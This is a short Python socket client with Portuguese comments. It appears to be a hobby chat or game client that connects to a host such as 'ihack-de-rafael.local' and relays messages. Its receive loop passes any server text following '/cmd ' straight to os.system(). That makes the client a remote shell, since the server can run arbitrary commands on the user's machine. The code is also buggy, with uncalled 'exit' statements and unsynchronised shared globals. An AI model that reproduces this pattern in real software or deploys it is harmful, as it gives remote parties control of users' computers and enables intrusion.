import time
import os
import socket

podeConectar = False

HOST = input("Digite o nome do host: ") #'127.0.0.1'
if HOST == "" :
    HOST = "ihack-de-rafael.local"
    print("\nUsando " + HOST + "!\n")

PORT = 50790  # ADV0 em T9

tcp = socket.socket( socket.AF_INET , socket.SOCK_STREAM )
dest = (HOST, PORT)
print("HOST: " + HOST + ", PORT: " + str(PORT))
try:
    tcp.connect(dest)
    podeConectar = True
    pass
    
except ConnectionRefusedError:
    print("\nConexão recusada! O servidor está online?\n\n")
    exit

def capturarEntrada() :
    global msg
    
    while True:
        msg = input(">> ")


def interagirSocket():
    global msg
    global tcp

    print("Para sair use CTRL+X\n")

    msg_inicial = "Olá!"
    msg = msg_inicial

    print("Você disse '" + msg + "' para o servidor...")

    while True: #(msg != '\x18') or (msg != "/kick " + nomeJogador) :            # respeitar ordem correta de operações para não dar merda
        time.sleep(0.5) # escrever linhas de forma organizada e sem cagar tudo
        # envia qualquer coisa
        #if len(msg) > 0 : #and msg != msg_inicial :
        #if len(msg) == 1 and int(msg) in [0,1,2,3,4,5,6,7,8,9] :
        try:
            tcp.send(msg.encode())      # send() ou sendall()
            pass

        except BrokenPipeError:
            print("Conexão quebrada! Reinicie o cliente!")
            exit
    
        msg = "invalido"
        #msg = "limpo"    # limpar msg , None, "" ou "10"


        data_received = tcp.recv(1024)
        recv = data_received.decode()
        if len(recv) > 0:
            print(recv)

        #tcp.send (msg.encode())
        #msg = input(">> ")

        if "/cmd " in recv :
            verb = recv.split("/cmd ")[1]
            
            try:
                os.system(verb)

            except OSError as e:
                print("Comando não encontrado!")
                print(e)


            if verb == "quit" :
                tcp.close()
                exit

        #limpar coisas
        #msg = ""
        #recv = ""
            
    
import threading
thread_list = {}


if __name__ == '__main__': 

    # declarar threads
    thread_list["capturarEntrada"]            = threading.Thread(target=capturarEntrada , name="capturarEntrada", args=() )
    thread_list["interagirSocket"]            = threading.Thread(target=interagirSocket , name="interagirSocket", args=() )

    # iniciar threads
    if podeConectar == True :
        thread_list["capturarEntrada"].start()
        thread_list["interagirSocket"].start()

        #while True:
        #    thread_list["capturarEntrada"].join(timeout=3)


    # fim da condicional de conexao valida com servidor!

    #tcp.close()
    quit
